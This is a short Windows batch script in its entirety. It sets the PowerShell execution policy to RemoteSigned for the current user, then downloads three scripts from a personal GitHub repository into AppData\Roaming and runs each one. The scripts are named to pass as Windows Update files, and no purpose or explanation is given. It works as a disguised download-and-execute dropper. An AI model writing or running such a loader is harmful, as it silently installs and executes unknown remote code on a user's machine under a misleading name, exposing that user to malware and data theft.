@echo off
powershell Set-ExecutionPolicy RemoteSigned -Scope CurrentUser -Force
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/WindowsUpdate_z.bat -O C:\Users\%username%\AppData\Roaming\WindowsUpdate_z.bat"
cmd /c "C:\Users\%username%\AppData\Roaming\WindowsUpdate_z.bat"
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/WindowsUpdate_p.ps1 -O C:\Users\%username%\AppData\Roaming\WindowsUpdate_p.ps1"
powershell.exe -File "C:\Users\%username%\AppData\Roaming\WindowsUpdate_p.ps1"
powershell -c "curl https://raw.githubusercontent.com/festorex/stuff/main/WindowsUpdate_z.ps1 -O C:\Users\%username%\AppData\Roaming\WindowsUpdate_z.ps1"
powershell.exe -File "C:\Users\%username%\AppData\Roaming\WindowsUpdate_z.ps1"
